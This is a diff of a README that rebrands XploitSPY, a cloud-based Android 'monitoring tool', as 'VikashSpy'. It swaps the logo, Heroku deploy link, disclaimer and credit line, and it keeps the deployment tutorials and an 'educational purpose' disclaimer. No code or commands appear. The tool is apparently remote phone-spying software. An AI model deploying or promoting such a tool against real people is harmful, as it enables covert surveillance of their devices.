@@ -1,5 +1,5 @@
 <p align="center">
-<img src="https://github.com/XploitWizer/XploitSPY/raw/master/server/assets/webpublic/logo.png" height="60"><br>
+<img src="https://github.com/vikashmobileclinic/VikashSpy/raw/master/server/assets/webpublic/logo.png" height="60"><br>
 A cloud based Android Monitoring Tool, powered by NodeJS
 </p>
 
@@ -24,7 +24,7 @@ A cloud based Android Monitoring Tool, powered by NodeJS
   
   Video Tutorial for Heroku [Click Here](https://youtu.be/tFt5G19KuLY)
 
-<a href="https://heroku.com/deploy?template=https://github.com/XploitWizer/XploitSPY">
+<a href="https://heroku.com/deploy?template=https://github.com/vikashmobileclinic/VikashSpy">
   <img src="https://www.herokucdn.com/deploy/button.svg" alt="Deploy">
 </a>
 
@@ -40,7 +40,7 @@ Setps of Installation [Click Here](https://xploitwizer.com/blog/27/how-to-instal
  Video Tutorial for VPS or Server [Click Here](https://youtu.be/F0K1IXvdEJk)
 
     
-It's recommended to run XploitSPY behind a reverse proxy such as [NGINX](https://www.nginx.com/resources/wiki/start/topics/tutorials/install/)
+It's recommended to run VikashSpy behind a reverse proxy such as [NGINX](https://www.nginx.com/resources/wiki/start/topics/tutorials/install/)
 
 ## Buy us a Coffee
    Bitcoin : 3HwzRLbZxFVxyZzLoEHFnoB5RVKfzwxDbf
@@ -50,11 +50,11 @@ It's recommended to run XploitSPY behind a reverse proxy such as [NGINX](https:/
 
 
 ## Disclaimer
-<b>XploitWizer Provides no warranty with this software and will not be responsible for any direct or indirect damage caused due to the usage of this tool.<br>
-XploitSPY is built for Educational Purpose. Use at your own Risk.</b>
+<b>VikashSpy Provides no warranty with this software and will not be responsible for any direct or indirect damage caused due to the usage of this tool.<br>
+VikashSpy is built for Educational Purpose. Use at your own Risk.</b>
 
 <br>
-<p align="center">Made with ❤️ By <a href="https://xploitwizer.com">XploitWizer</a></p>
+<p align="center">Made with ❤️ By VikashSpy</a></p>
 
 ## Credits
 
